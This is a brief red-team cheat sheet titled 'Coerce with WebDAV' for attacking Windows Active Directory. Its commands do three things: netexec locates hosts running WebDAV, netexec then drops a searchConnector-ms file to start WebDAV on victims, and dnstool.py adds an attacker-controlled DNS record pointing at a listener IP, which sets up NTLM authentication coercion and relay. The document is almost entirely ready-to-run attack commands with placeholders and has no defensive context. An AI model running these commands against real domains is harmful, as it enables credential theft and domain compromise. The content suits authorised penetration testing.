# Coerce with WebDAV

## Tools: dnstool , CrackMapExec/Netexec

### Commands:

    netexec smb IP -u USER -p PASSWORD -M webdav (Find)

### Start webdav with Documents.searchConnector-ms file

    netexec smb IP -u USER -p PASSWORD -M drop-sc

### Add attack computer in DNS

    dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record 'ATTACK_NAME' --action add --data LISTENER_IP DC_IP
